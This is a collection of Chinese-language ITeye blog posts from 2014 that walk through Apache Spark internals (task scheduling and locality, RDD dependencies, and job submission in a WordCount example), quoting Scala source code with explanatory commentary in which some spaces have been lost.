也就是scheduler调度在传入的Locality级别时所花的时间是否超过指定的等待时间，
 
如果超过表示需要放大Locality的查找级别。
 
privatedef getLocalityWait(level: TaskLocality.TaskLocality): Long = {
 
valdefaultWait = conf.get("spark.locality.wait", "3000")
 
 level match {
 
case TaskLocality.PROCESS_LOCAL =>
 
conf.get("spark.locality.wait.process", defaultWait).toLong
 
case TaskLocality.NODE_LOCAL =>
 
conf.get("spark.locality.wait.node", defaultWait).toLong
 
case TaskLocality.RACK_LOCAL =>
 
conf.get("spark.locality.wait.rack", defaultWait).toLong
 
case TaskLocality.ANY =>
 
0L
 
 }
 
 }
 
 
 
10.SchedulerBackend.reviveOffers()的调度处理流程：
 
SchedulerBackend的实现为CoarseGrainedSchedulerBackend。
 
overridedef reviveOffers() {
 
driverActor ! ReviveOffers
 
 }
 
以上代码发CoarseGrainedSchedulerBackend内部的DriverActor发送消息，处理ReviveOffers事件。
 
case ReviveOffers =>
 
 makeOffers()
 
................
 
def makeOffers() {
 
见下面的launchTasks与resourceOffers函数
 
 launchTasks(scheduler.resourceOffers(
 
executorHost.toArray.map {case (id, host) => new WorkerOffer(id, host, freeCores(id))}))
 
 }
 
调用TaskSchedulerImpl.resourceOffers并传入注册的worker中executorid与host的kv array.
 
 
 
def resourceOffers(offers: Seq[WorkerOffer]): Seq[Seq[TaskDescription]] = synchronized {
 
 SparkEnv.set(sc.env)
 
 
 
// Mark each slave as alive and remember its hostname
 
for (o <- offers) {
 
executorIdToHost(o.executorId) = o.host
 
此部分主要是在worker注册时executorsByHost中还不存在时会执行，
 
if (!executorsByHost.contains(o.host)) {
 
executorsByHost(o.host) = new HashSet[String]()
 
 executorGained(o.executorId, o.host)
 
 }
 
 }
 
offers表示有多少个注册的worker的executor,根据每一个worker中可能的cpu core个数生成可执行的task个数。
 
// Build a list of tasks to assign to each worker
 
valtasks = offers.map(o => new ArrayBuffer[TaskDescription](o.cores))
 
可分配的cpu个数,由此处可以看出每一个任务分配时最好按每个worker能分配的最大cpu core个数来分配。
 
valavailableCpus = offers.map(o => o.cores).toArray
 
得到队列中的所有的TaskSetManager列表。
 
valsortedTaskSets = rootPool.getSortedTaskSetQueue()
 
for (taskSet <- sortedTaskSets) {
 
 logDebug("parentName: %s, name: %s, runningTasks: %s".format(
 
taskSet.parent.name, taskSet.name, taskSet.runningTasks))
 
 }
 
 
 
计算task的Locality级别，launchedTask=false表示需要放大Locality的级别。
 
// Take each TaskSet in our scheduling order, and then offer it each node in increasing order
 
// of locality levels so that it gets a chance to launch local tasks on all of them.
 
varlaunchedTask = false
 
计算task的Locality,此处是一个for的迭代调用，先从taskset列表中拿出一个tasetset,
 
子迭代是从PROCESS_LOCAL开始迭代locality的级别。
 
for (taskSet <- sortedTaskSets; maxLocality <- TaskLocality.values) {
 
do {
 
launchedTask = false
 
迭代调用每一个worker的值，从每一个worker中在taskset中选择task的执行级别，生成TaskDescription
 
for (i <- 0 until offers.size) {
 
得到迭代出的worker的executorid与host
 
valexecId = offers(i).executorId
 
valhost = offers(i).host
 
通过TaskSetManager.resourceOffer选择一个执行级别,通过此函数选择Locality级别时，
 
不能超过传入的maxLocality,每次生成一个task,
 
 
 
for (task <- taskSet.resourceOffer(execId, host, availableCpus(i), maxLocality)) {
 
 
 
每次生成一个task,把生成的task添加到上面的tasks列表中。
 
 
 
tasks(i) += task
 
valtid = task.taskId
 
taskIdToTaskSetId(tid) = taskSet.taskSet.id
 
taskSetTaskIds(taskSet.taskSet.id) += tid
 
taskIdToExecutorId(tid) = execId
 
 
 
设置当前executorid设置到activeExecutorIds列表中，当有多个依赖的stage执行时，
 
第二个stage在submitTasks时，生成TaskSetManager时，会根据的activeExecutorIds值，
 
在pendingTasksForExecutor中生成等执行的PROCESS_LOCAL的pending tasks.
 
 
 
activeExecutorIds += execId
 
 
 
把executor对应的host记录到executorsByHost容器中。
 
 
 
executorsByHost(host) += execId
 
 
 
当前worker中可用的cpu core的值需要减去一，这样能充分保证一个cpu core执行一个task
 
 
 
 availableCpus(i) -= 1
 
这个值用来检查是否在当前的Locality级别中接着执行其它的task的分配，
 
如果这个值为true,不放大maxLocality的级别，从下一个worker中接着分配剩余的task
 
launchedTask = true
 
 }
 
 }
 
 } while (launchedTask)
 
 }
 
 
 
if (tasks.size > 0) {
 
设置hasLaunchedTask的值为true,表示task的执行分配完成，在上面提到过的检查线程中对线程执行停止操作。
 
hasLaunchedTask = true
 
 }
 
returntasks
 
 }
 
 
 
 
 
10.1 TaskSetManager.resourceOffer流程分析
 
 
 
def resourceOffer(
 
 execId: String,
 
host: String,
 
 availableCpus: Int,
 
 maxLocality: TaskLocality.TaskLocality)
 
 : Option[TaskDescription] =
 
 {
 
如果完成的task个数小于要生成的总task个数，同时当前cpu可用的core个数和大于或等于一个配置的，默认1
 
if (tasksSuccessful < numTasks && availableCpus >= CPUS_PER_TASK) {
 
valcurTime = clock.getTime()
 
通过现在执行task分配的时间减去上一次并从currentLocalityIndex的下标开始，
 
 取出locality对应的task分配等待时间，如果时间超过了此配置，把下标值加一，
 
 找到下一个locality的配置时间,按这方式找，直到找到ANY的值，具体可见下面的此方法说明
 
varallowedLocality = getAllowedLocalityLevel(curTime)
 
如果通过的locality的级别超过了传入的最大locality级别，把级别设置为传入的最大级别
 
if (allowedLocality > maxLocality) {
 
allowedLocality = maxLocality // We're not allowed to search for farther-away tasks
 
 }
 
findTask主要是从对应的pending的列表中根据对应的Locality拿到对应的task的下标，在TaskSet.tasks中的下标。
 
 findTask(execId, host, allowedLocality) match {
 
case Some((index, taskLocality)) => {
 
// Found a task; do some bookkeeping and return a task description
 
valtask = tasks(index)
 
valtaskId = sched.newTaskId()
 
// Figure out whether this should count as a preferred launch
 
 logInfo("Starting task %s:%d as TID %s on executor %s: %s (%s)".format(
 
taskSet.id, index, taskId, execId, host, taskLocality))
 
// Do various bookkeeping
 
 copiesRunning(index) += 1
 
valinfo = new TaskInfo(taskId, index, curTime, execId, host, taskLocality)
 
taskInfos(taskId) = info
 
taskAttempts(index) = info :: taskAttempts(index)
 
把分配此task的locality级别拿到对应的下标，并重新设置下标的值。
 
// Update our locality level for delay scheduling
 
currentLocalityIndex = getLocalityIndex(taskLocality)
 
把这次的task的分配时间设置成最后一次分配时间。
 
lastLaunchTime = curTime
 
// Serialize and return the task
 
valstartTime = clock.getTime()
 
// We rely on the DAGScheduler to catch non-serializable closures and RDDs, so in here
 
// we assume the task can be serialized without exceptions.
 
valserializedTask = Task.serializeWithDependencies(
 
task, sched.sc.addedFiles, sched.sc.addedJars, ser)
 
valtimeTaken = clock.getTime() - startTime
 
 addRunningTask(taskId)
 
 logInfo("Serialized task %s:%d as %d bytes in %d ms".format(
 
taskSet.id, index, serializedTask.limit, timeTaken))
 
valtaskName = "task %s:%d".format(taskSet.id, index)
 
如果是第一次执行，通过DAGScheduler.taskStarted发送BeginEvent事件。
 
if (taskAttempts(index).size == 1)
 
 taskStarted(task,info)
 
return Some(new TaskDescription(taskId, execId, taskName, index, serializedTask))
 
 }
 
case _ =>
 
 }
 
 }
 
 None
 
 }
 
根据超时时间配置，如果这次分配task的时间减去上次task分配的时间超过了locality分配等待的配置时间，
 
把locality的级别向上移动一级，并重新比对时间，拿到不超时的locality级别或ANY的级别。
 
privatedef getAllowedLocalityLevel(curTime: Long): TaskLocality.TaskLocality = {
 
while (curTime - lastLaunchTime >= localityWaits(currentLocalityIndex) &&
 
currentLocalityIndex < myLocalityLevels.length - 1)
 
 {
 
下标值加一，也就是把当前的Locality的级别向上放大一级。
 
// Jump to the next locality level, and remove our waiting time for the current one since
 
// we don't want to count it again on the next one
 
lastLaunchTime += localityWaits(currentLocalityIndex)
 
currentLocalityIndex += 1
 
 }
 
myLocalityLevels(currentLocalityIndex)
 
 }
 
 
 
DAGScheduler中处理BeginEvent事件：
 
case BeginEvent(task, taskInfo) =>
 
for (
 
job <- idToActiveJob.get(task.stageId);
 
stage <- stageIdToStage.get(task.stageId);
 
stageInfo <- stageToInfos.get(stage)
 
 ) {
 
if (taskInfo.serializedSize > TASK_SIZE_TO_WARN * 1024 &&
 
 !stageInfo.emittedTaskSizeWarning) {
 
stageInfo.emittedTaskSizeWarning = true
 
 logWarning(("Stage %d (%s) contains a task of very large " +
 
"size (%d KB). The maximum recommended task size is %d KB.").format(
 
task.stageId, stageInfo.name, taskInfo.serializedSize / 1024, TASK_SIZE_TO_WARN))
 
 }
 
 }
 
listenerBus.post(SparkListenerTaskStart(task, taskInfo))
 
 
 
11. CoarseGrainedSchedulerBackend.launchTasks流程
 
执行task的执行，发送LaunchTask事件处理消息
 
def launchTasks(tasks: Seq[Seq[TaskDescription]]) {
 
for (task <- tasks.flatten) {
 
 freeCores(task.executorId) -= 1
 
根据worker注册时的actor,向此actor发送LaunchTask事件。
 
executorActor(task.executorId) ! LaunchTask(task)
 
 }
 
 }
 
 
 
12.启动task,由于是on yarn的模式，worker的actor在CoarseGrainedExecutorBackend.
 
处理代码如下：
 
case LaunchTask(taskDesc) =>
 
 logInfo("Got assigned task " + taskDesc.taskId)
 
if (executor == null) {
 
 logError("Received LaunchTask command but executor was null")
 
 System.exit(1)
 
 } else {
 
executor.launchTask(this, taskDesc.taskId, taskDesc.serializedTask)
 
 }
 
.............................
 
通过Executor启动task的执行。
 
其它actor的消息处理与task的具体执行与shuffle后面分析，这里先不做细的说明。
 
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
RDD的依赖关系, hongs-yang.iteye.com.blog.2059298, Sat, 03 May 2014 01:39:03 +0800

RDD的依赖关系
 
Rdd之间的依赖关系通过rdd中的getDependencies来进行表示，
 
在提交job后，会通过在 DAGShuduler.submitStage-->getMissingParentStages
 
privatedef getMissingParentStages(stage: Stage): List[Stage] = {
 
valmissing = new HashSet[Stage]
 
valvisited = new HashSet[RDD[_]]
 
def visit(rdd: RDD[_]) {
 
if (!visited(rdd)) {
 
visited += rdd
 
if (getCacheLocs(rdd).contains(Nil)) {
 
for (dep <- rdd.dependencies) {
 
depmatch {
 
caseshufDep: ShuffleDependency[_,_] =>
 
valmapStage = getShuffleMapStage(shufDep, stage.jobId)
 
if (!mapStage.isAvailable) {
 
missing += mapStage
 
 }
 
casenarrowDep: NarrowDependency[_] =>
 
 visit(narrowDep.rdd)
 
 }
 
 }
 
 }
 
 }
 
 }
 
 visit(stage.rdd)
 
missing.toList
 
 }
 
在以上代码中得到rdd的相关dependencies，每一个rdd生成时传入rdd的dependencies信息。
 
如SparkContext.textFile,时生成的HadoopRDD时。此RDD的默认为dependencys为Nil.
 
Nil是一个空的列表。
 
class HadoopRDD[K, V](
 
 sc: SparkContext,
 
 broadcastedConf: Broadcast[SerializableWritable[Configuration]],
 
 initLocalJobConfFuncOpt: Option[JobConf => Unit],
 
 inputFormatClass: Class[_ <: InputFormat[K, V]],
 
 keyClass: Class[K],
 
 valueClass: Class[V],
 
 minSplits: Int)
 
extends RDD[(K, V)](sc, Nil) with Logging {
 
 
 
Dependency分为ShuffleDependency与NarrowDependency。
 
其中NarrowDependency又包含OneToOneDependency/RangeDependency
 
Dependency唯一的成员就是rdd, 即所依赖的rdd, 或parent rdd
 
abstractclass Dependency[T](valrdd: RDD[T]) extends Serializable
 
 
 
OneToOneDependency关系：
 
最简单的依赖关系, 即parent和child里面的partitions是一一对应的, 典型的操作就是map, filter
 
其实partitionId就是partition在RDD中的序号, 所以如果是一一对应, 
 
那么parent和child中的partition的序号应该是一样的,如下是OneToOneDependency的定义
 
/**
 
 * Represents a one-to-one dependency between partitions of the parent and child RDDs.
 
 */
 
class OneToOneDependency[T](rdd: RDD[T]) extends NarrowDependency[T](rdd) {
 
此类的Dependency中parent中的partitionId与childRDD中的partitionId是一对一的关系。
 
也就是partition本身范围不会改变, 一个parition经过transform还是一个partition,
 
 虽然内容发生了变化, 所以可以在local完成，此类场景通常像mapreduce中只有map的场景，
 
第一个RDD执行完成后的MAP的parition直接运行第二个RDD的Map,也就是local执行。
 
overridedef getParents(partitionId: Int) = List(partitionId)
 
}
 
 
 
RangeDependency关系：
 
此类应用虽然仍然是一一对应, 但是是parent RDD中的某个区间的partitions对应到child RDD中的某个区间的partitions 典型的操作是union, 多个parent RDD合并到一个child RDD, 故每个parent RDD都对应到child RDD中的一个区间 需要注意的是, 这里的union不会把多个partition合并成一个partition, 而是的简单的把多个RDD中的partitions放到一个RDD里面, partition不会发生变化,
 
 
 
rdd参数，parentRDD
 
inStart参数，parentRDD的partitionId计算的起点位置。
 
outStart参数，childRDD中计算parentRDD的partitionId的起点位置，
 
length参数，parentRDD中partition的个数。
 
class RangeDependency[T](rdd: RDD[T], inStart: Int, outStart: Int, length: Int)
 
extends NarrowDependency[T](rdd) {
 
 
 
overridedef getParents(partitionId: Int) = {
 
检查partitionId的合理性，此partitionId在childRDD的partitionId中的范围需要合理。
 
if (partitionId >= outStart && partitionId < outStart + length) {
 
计算出ParentRDD的partitionId的值。
 
 List(partitionId - outStart + inStart)
 
 } else {
 
 Nil
 
 }
 
 }
 
}
 
 
 
典型的应用场景union的场景把两个RDD合并到一个新的RDD中。
 
def union(other: RDD[T]): RDD[T] = new UnionRDD(sc, Array(this, other))
 
使用union的, 第二个参数是, 两个RDD的array, 返回值就是把这两个RDD union后产生的新的RDD
 
 
 
ShuffleDependency关系：
 
此类依赖首先要求是Product2与PairRDDFunctions的k,v的形式，这样才能做shuffle，和hadoop一样。
 
其次, 由于需要shuffle, 所以当然需要给出partitioner,默认是HashPartitioner 如何完成shuffle
 
然后, shuffle不象map可以在local进行, 往往需要网络传输或存储, 所以需要serializerClass
 
 默认是JavaSerializer，一个类名，用于序列化网络传输或者以序列化形式缓存起来的各种对象。
 
默认情况下Java的序列化机制可以序列化任何实现了Serializable接口的对象，
 
但是速度是很慢的，
 
因此当你在意运行速度的时候我们建议你使用spark.KryoSerializer 并且配置 Kryo serialization。
 
可以是任何spark.Serializer的子类。
 
 
 
最后, 每个shuffle需要分配一个全局的id, context.newShuffleId()的实现就是把全局id累加
 
 
 
class ShuffleDependency[K, V](
 
 @transient rdd: RDD[_ <: Product2[K, V]],
 
valpartitioner: Partitioner,
 
valserializerClass: String = null)
 
extends Dependency(rdd.asInstanceOf[RDD[Product2[K, V]]]) {
 
 
 
valshuffleId: Int = rdd.context.newShuffleId()
 
}
 
 
 
 
 
生成RDD过程分析
 
生成rdd我们还是按wordcount中的例子来说明；
 
 val file = sc.textFile("/hadoop-test.txt")
 
valcounts = file.flatMap(line => line.split(" "))
 
 .map(word => (word, 1)).reduceByKey(_ + _) 
 
counts.saveAsTextFile("/newtest.txt")
 
 
 
1.首先SparkContext.textFile通过调用hadoopFile生成HadoopRDD实例，
 
 textFile-->hadoopFile-->HadoopRDD,此时RDD的Dependency为Nil,一个空的列表。
 
 此时的HadoopRDD为RDD<K,V>，每执行next方法时返回一个Pair,也就是一个KV(通过compute函数)
 
2.textFile得到HadoopRDD后，调用map函数，
 
 map中每执行一次得到一个KV(compute中getNext,new NextIterator[(K, V)] )，
 
 取出value的值并toString,生成MappedRDD<String>。此RDD的上层RDD就是1中生成的RDD。
 
 同时此RDD的Dependency为OneToOneDependency。
 
def textFile(path: String, minSplits: Int = defaultMinSplits): RDD[String] = {
 
 hadoopFile(path, classOf[TextInputFormat], classOf[LongWritable], classOf[Text],
 
 minSplits).map(pair => pair._2.toString)
 
 }
 
def map[U: ClassTag](f: T => U): RDD[U] = new MappedRDD(this, sc.clean(f))
 
以上代码中传入的this其实就是1中生成的HadoopRDD.
 
 
 
3.flatMap函数，把2中每一行输出通过一定的条件修改成0到多个新的item.生成FlatMappedRDD实例，
 
 同时根据implicit隐式转换生成PairRDDFunctions。下面两处代码中的红色部分。
 
 在生成FlatMappedRDD是，此时的上一层RDD就是2中生成的RDD。
 
 同时此RDD的Dependency为OneToOneDependency。
 
class FlatMappedRDD[U: ClassTag, T: ClassTag](
 
 prev: RDD[T],
 
 f: T => TraversableOnce[U])
 
extends RDD[U](prev) 
 
 
 
implicitdef rddToPairRDDFunctions[K: ClassTag, V: ClassTag](rdd: RDD[(K, V)]) =
 
new PairRDDFunctions(rdd)
 
 
 
4.map函数，由于3中生成的FlatMappedRDD生成出来的结果，通过implicit的隐式转换生成PairRDDFunctions。
 
 此时的map函数需要生成隐式转换传入的RDD<K,V>的一个RDD，
 
 因此map函数的执行需要生成一个MappedRDD<K,V> 的RDD，同时此RDD的Dependency为OneToOneDependency。
 
 以下代码的红色部分。 －－－RDD[(K, V)]。。
 
valcounts = file.flatMap(line => line.split(" "))
 
 .map(word => (word, 1)).reduceByKey(_ + _) 
 
5.reduceByKey函数，此函数通过implicit的隐式转换中的函数来进行，主要是传入一个计算两个value的函数。
 
 reduceByKey这类的shuffle的RDD时，最终生成一个ShuffleRDD,
 
 此RDD生成的Dependency为ShuffleDependency。
 
 具体说明在下面的reduceByKey代码中，
 
 首先在每一个map生成MapPartitionsRDD把各partitioner中的数据通过进行合并。合并通过Aggregator实例。
 
 最后通过对合并后的MapPartitionsRDD,此RDD相当于mapreduce中的combiner，生成ShuffleRDD.
 
def reduceByKey(func: (V, V) => V): RDD[(K, V)] = {
 
 reduceByKey(defaultPartitioner(self), func)
 
 }
 
 
 
def combineByKey[C](createCombiner: V => C,//创建combiner,通过V的值创建C
 
 mergeValue: (C, V) => C,//combiner已经创建C已经有一个值，把第二个的V叠加到C中，
 
 mergeCombiners: (C, C) => C,//把两个C进行合并，其实就是两个value的合并。
 
 partitioner: Partitioner,//Shuffle时需要的Partitioner 
 
 mapSideCombine: Boolean = true,//为了减小传输量, 很多combine可以在map端先做,
 
 比如叠加, 可以先在一个partition中把所有相同的key的value叠加, 再shuffle 
 
 serializerClass: String = null): RDD[(K, C)] = {
 
if (getKeyClass().isArray) {
 
if (mapSideCombine) {
 
thrownew SparkException("Cannot use map-side combining with array keys.")
 
 }
 
if (partitioner.isInstanceOf[HashPartitioner]) {
 
thrownew SparkException("Default partitioner cannot partition array keys.")
 
 }
 
 }
 
生成一个Aggregator实例。
 
valaggregator = new Aggregator[K, V, C](createCombiner, mergeValue, mergeCombiners)
 
如果RDD本身的partitioner与传入的partitioner相同，表示不需要进行shuffle
 
if (self.partitioner == Some(partitioner)) {
 
生成MapPartitionsRDD，直接在map端当前的partitioner下调用Aggregator.combineValuesByKey。
 
 把相同的key的value进行合并。
 
 self.mapPartitionsWithContext((context, iter) => {
 
new InterruptibleIterator(context, aggregator.combineValuesByKey(iter, context))
 
 }, preservesPartitioning = true)
 
 } elseif (mapSideCombine) {
 
生成MapPartitionsRDD，先在map端当前的partitioner下调用Aggregator.combineValuesByKey。
 
 把相同的key的value进行合并。
 
combineValuesByKey中检查如果key对应的C如果不存在，通过createCombiner创建C，
 
 否则key已经存在C时，通过mergeValue把新的V与上一次的C进行合并，
 
mergeValue其实就是传入的reduceByKey(_ + _) 括号中的函数，与reduce端函数相同。
 
valcombined = self.mapPartitionsWithContext((context, iter) => {
 
aggregator.combineValuesByKey(iter, context)
 
 }, preservesPartitioning = true)
 
生成 ShuffledRDD，进行shuffle操作，因为此时会生成ShuffleDependency,重新生成一个新的stage.
 
valpartitioned = new ShuffledRDD[K, C, (K, C)](combined, partitioner)
 
 .setSerializer(serializerClass)
 
在上一步完成，也就是shuffle完成，重新在reduce端进行合并操作。通过Aggregator.combineCombinersByKey
 
spark这些地方的方法定义都是通过动态加载执行的函数的方式，所以可以做到map端执行完成后reduce再去执行后续的处理。
 
因为函数在map时只是进行了定义，reduce端才对函数进行执行。
 
partitioned.mapPartitionsWithContext((context, iter) => {
 
new InterruptibleIterator(context, aggregator.combineCombinersByKey(iter, context))
 
 }, preservesPartitioning = true)
 
 } else {
 
不执行map端的合并操作，直接shuffle，并在reduce中执行合并。
 
// Don't apply map-side combiner.
 
valvalues = new ShuffledRDD[K, V, (K, V)](self, partitioner).setSerializer(serializerClass)
 
values.mapPartitionsWithContext((context, iter) => {
 
new InterruptibleIterator(context, aggregator.combineValuesByKey(iter, context))
 
 }, preservesPartitioning = true)
 
 }
 
 }
 
 
 
已有 0 人发表留言，猛击->>这里<<-参与讨论
ITeye推荐
—软件人才免语言低担保 赴美带薪读研！— 

##################################################
从wordcount分析spark提交job, hongs-yang.iteye.com.blog.2059206, Fri, 02 May 2014 12:51:37 +0800

从WordCount开始分析
 
编写一个例子程序
 
编写一个从HDFS中读取并计算wordcount的例子程序:
 
package org.apache.spark.examples
 
 
 
import org.apache.spark.SparkContext
 
import org.apache.spark.SparkContext._
 
 
 
objectWordCount {
 
 
 
def main(args : Array[String]) {
 
valsc = new SparkContext(args(0), "wordcount by hdfs", 
 
 System.getenv("SPARK_HOME"),SparkContext.jarOfClass(this.getClass()))
 
//从hadoophdfs的根路径下得到一个文件
 
valfile = sc.textFile("/hadoop-test.txt")
 
valcounts = file.flatMap(line => line.split(" "))
 
 .map(word => (word, 1)).reduceByKey(_ + _)
 
 
 
counts.saveAsTextFile("/newtest.txt")
 
 }
 
 
 
}
 
 
 
生成SparkContext实例
 
在上面例子中，要执行map/reduce操作，首先需要一个SparkContext，因此看看SparkContext的实例生成
 
 def this(
 
 master: String,
 
 appName: String,
 
 sparkHome: String = null,
 
 jars: Seq[String] = Nil,
 
 environment: Map[String, String] = Map(),
 
 preferredNodeLocationData: Map[String, Set[SplitInfo]] = Map()) =
 
 {
 
this(SparkContext.updatedConf(new SparkConf(), master, appName, sparkHome, jars, environment),
 
 preferredNodeLocationData)
 
 }
 
 
 
编写WordCount例子时使用了上面列出的构造函数，后面两个environment与 preferredNodeLocationData传入为默认值。
 
调用updatedConf的单例函数，生成或更新当前的SparkConf实例。
 
调用SparkContext的默认构造函数。
 
1.生成并启动监控的Jetty ui,SparkUI.
 
2.生成TaskScheduler实例，并启动。
 
 此函数会根据不同的master name生成不同的TaskScheduler实例。,yarn-cluster为YarnClusterScheduler。
 
 主要用来启动/停止task,监控task的运行状态。
 
private[spark] vartaskScheduler = SparkContext.createTaskScheduler(this, master, appName)
 
taskScheduler.start()
 
3.生成DAGScheduler实例，并启动。
 
 
 
 @volatileprivate[spark] vardagScheduler = new DAGScheduler(taskScheduler)
 
dagScheduler.start()
 
 
 
在scheduler进行start操作后，通过调用postStartHook来把SparkContext添加到appmaster中。
 
生成WorkerRunnable线程，通过nmclient启动worker对应的container。此container线程CoarseGrainedExecutorBackend的实例,此实例通过Executor实例来加载相关的task。
 
SparkContext.textFile生成RDD
 
此方法用来生成RDD的实例，通常读取文本文件的方式通过textFile来进行，并其调用hadoopFile来执行。
 
通过hadoopFile得到一个HadoopRDD<K,V>的实例后，通过.map得到V的值。并生成RDD返回。
 
def textFile(path: String, minSplits: Int = defaultMinSplits): RDD[String] = {
 
 hadoopFile(path, classOf[TextInputFormat], classOf[LongWritable], classOf[Text],
 
minSplits).map(pair => pair._2.toString)
 
 }
 
最终通过hadoopFile函数生成一个HadoopRDD实例。
 
def hadoopFile[K, V](
 
 path: String,
 
 inputFormatClass: Class[_ <: InputFormat[K, V]],
 
 keyClass: Class[K],
 
 valueClass: Class[V],
 
 minSplits: Int = defaultMinSplits
 
 ): RDD[(K, V)] = {
 
// A Hadoop configuration can be about 10 KB, which is pretty big, so broadcast it.
 
valconfBroadcast = broadcast(newSerializableWritable(hadoopConfiguration))
 
valsetInputPathsFunc = (jobConf: JobConf) => FileInputFormat.setInputPaths(jobConf, path)
 
new HadoopRDD(
 
this,
 
confBroadcast,
 
 Some(setInputPathsFunc),
 
 inputFormatClass,
 
 keyClass,
 
 valueClass,
 
 minSplits)
 
 }
 
 
 
RDD函数的抽象执行
 
reduceByKey需要执行shuffle的reduce，也就是需要多个map中的数据集合到相同的reduce中运行，生成相关的DAG任务
 
 valfile = sc.textFile("/hadoop-test.txt")
 
valcounts = file.flatMap(line => line.split(" "))
 
 .map(word => (word, 1)).reduceByKey(_ + _)
 
counts.saveAsTextFile("/newtest.txt")
 
 
 
在以上代码中,textFile,flatMap,map,reduceByKey都是spark中RDD的transformation,
 
而saveAsTextFile才是RDD中进行执行操作的action.
 
以下引用http://my.oschina.net/hanzhankang/blog/200275的相关说明：
 
具体可参见：http://spark.apache.org/docs/0.9.0/scala-programming-guide.html。
 
1，transformation是得到一个新的RDD，方式很多，比如从数据源生成一个新的RDD，从RDD生成一个新的RDD 
 
2，action是得到一个值，或者一个结果（直接将RDD cache到内存中） 
 
所有的transformation都是采用的懒策略，就是如果只是将transformation提交是不会执行计算的，计算只有在action被提交的时候才被触发。
 
 
 
transformation操作： 
 
map(func):对调用map的RDD数据集中的每个element都使用func，然后返回一个新的RDD,这个返回的数据集是分布式的数据集 
 
filter(func) : 对调用filter的RDD数据集中的每个元素都使用func，然后返回一个包含使func为true的元素构成的RDD 
 
flatMap(func):和map差不多，但是flatMap生成的是多个结果 
 
mapPartitions(func):和map很像，但是map是每个element，而mapPartitions是每个partition 
 
mapPartitionsWithSplit(func):和mapPartitions很像，但是func作用的是其中一个split上，所以func中应该有index 
 
sample(withReplacement,faction,seed):抽样 
 
union(otherDataset)：返回一个新的dataset，包含源dataset和给定dataset的元素的集合 
 
distinct([numTasks]):返回一个新的dataset，这个dataset含有的是源dataset中的distinct的element 
 
groupByKey(numTasks):返回(K,Seq[V])，也就是hadoop中reduce函数接受的key-valuelist 
 
reduceByKey(func,[numTasks]):就是用一个给定的reduce func再作用在groupByKey产生的(K,Seq[V]),比如求和，求平均数 
 
sortByKey([ascending],[numTasks]):按照key来进行排序，是升序还是降序，ascending是boolean类型 
 
join(otherDataset,[numTasks]):当有两个KV的dataset(K,V)和(K,W)，返回的是(K,(V,W))的dataset,numTasks为并发的任务数 
 
cogroup(otherDataset,[numTasks]):当有两个KV的dataset(K,V)和(K,W)，返回的是(K,Seq[V],Seq[W])的dataset,numTasks为并发的任务数 
 
cartesian(otherDataset)：笛卡尔积就是m*n，大家懂的 
 
 
 
action操作：
 
reduce(func)：说白了就是聚集，但是传入的函数是两个参数输入返回一个值，这个函数必须是满足交换律和结合律的 
 
collect()：一般在filter或者足够小的结果的时候，再用collect封装返回一个数组 
 
count():返回的是dataset中的element的个数 
 
first():返回的是dataset中的第一个元素 
 
take(n):返回前n个elements，这个士driver program返回的 
 
takeSample(withReplacement，num，seed)：抽样返回一个dataset中的num个元素，随机种子seed 
 
saveAsTextFile（path）：把dataset写到一个text file中，或者hdfs，或者hdfs支持的文件系统中，spark把每条记录都转换为一行记录，然后写到file中 
 
saveAsSequenceFile(path):只能用在key-value对上，然后生成SequenceFile写到本地或者hadoop文件系统 
 
countByKey()：返回的是key对应的个数的一个map，作用于一个RDD 
 
foreach(func):对dataset中的每个元素都使用func 
 
 
 
RDD的action中提交Job
 
在执行RDD的saveAsTextFile时调用SparkContext.runJob方法
 
saveAsTextFile方法，--> saveAsHadoopFile,最终调用SparkContext.runJob方法
 
def saveAsTextFile(path: String) {
 
this.map(x => (NullWritable.get(), new Text(x.toString)))
 
 .saveAsHadoopFile[TextOutputFormat[NullWritable, Text]](path)
 
 }
 
......以下一行代码就是在saveASTextFile函数嵌套调用中最终调用的函数，调用SparkContext.runJob
 
self.context.runJob(self, writeToFile _)
 
SparkContext.runJob的定义：
 
 def runJob[T, U: ClassTag](rdd: RDD[T], func: (TaskContext, Iterator[T]) => U): Array[U] = {
 
 runJob(rdd, func, 0 until rdd.partitions.size, false)
 
 }
 
SparkContext的最终执行runJob函数定义
 
 def runJob[T, U: ClassTag](
 
 rdd: RDD[T],//此处是具体的RDD实例值
 
 func: (TaskContext, Iterator[T]) => U,//具体的执行的action的逻辑,如reduceByKey
 
 partitions: Seq[Int],//分区数组,一个数值从0到partitions.size-1
 
 allowLocal: Boolean,//是否可以在本地执行
 
//result的处理逻辑,每一个Task的处理
 
 resultHandler: (Int, U) => Unit) {
 
valcallSite = getCallSite
 
valcleanedFunc = clean(func)
 
 logInfo("Starting job: " + callSite)
 
valstart = System.nanoTime
 
通过DAGScheduler.runJob去执行job的运行操作，请看下面的DAGScheduler处理job提交。
 
dagScheduler.runJob(rdd, cleanedFunc, partitions, callSite, allowLocal,
 
 resultHandler, localProperties.get)
 
 logInfo("Job finished: " + callSite + ", took " + (System.nanoTime - start) / 1e9 + " s")
 
 rdd.doCheckpoint()
 
 }
 
DAGScheduler处理job提交
 
上面的函数最终通过DagScheduler.runJob进行执行。
 
 def runJob[T, U: ClassTag](
 
 rdd: RDD[T],
 
 func: (TaskContext, Iterator[T]) => U,
 
 partitions: Seq[Int],
 
 callSite: String,
 
 allowLocal: Boolean,
 
 resultHandler: (Int, U) => Unit,
 
 properties: Properties = null)
 
 {
 
valwaiter = submitJob(rdd, func, partitions, callSite, allowLocal, resultHandler, properties)
 
等待job运行完成。
 
waiter.awaitResult() match {
 
case JobSucceeded => {}
 
case JobFailed(exception: Exception, _) =>
 
 logInfo("Failed to run " + callSite)
 
throwexception
 
 }
 
 }
 
调用DAGShceduler.submitJob来提交任务。
 
 def submitJob[T, U](
 
 rdd: RDD[T],
 
 func: (TaskContext, Iterator[T]) => U,
 
 partitions: Seq[Int],
 
 callSite: String,
 
 allowLocal: Boolean,
 
 resultHandler: (Int, U) => Unit,
 
 properties: Properties = null): JobWaiter[U] =
 
 {
 
// Check to make sure we are not launching a task on a partition that does not exist.
 
valmaxPartitions = rdd.partitions.length
 
 partitions.find(p => p >= maxPartitions).foreach { p =>
 
thrownew IllegalArgumentException(
 
"Attempting to access a non-existent partition: " + p + ". " +
 
"Total number of partitions: " + maxPartitions)
 
 }
 
 
 
valjobId = nextJobId.getAndIncrement()
 
if (partitions.size == 0) {
 
returnnew JobWaiter[U](this, jobId, 0, resultHandler)
 
 }
 
 
 
 assert(partitions.size > 0)
 
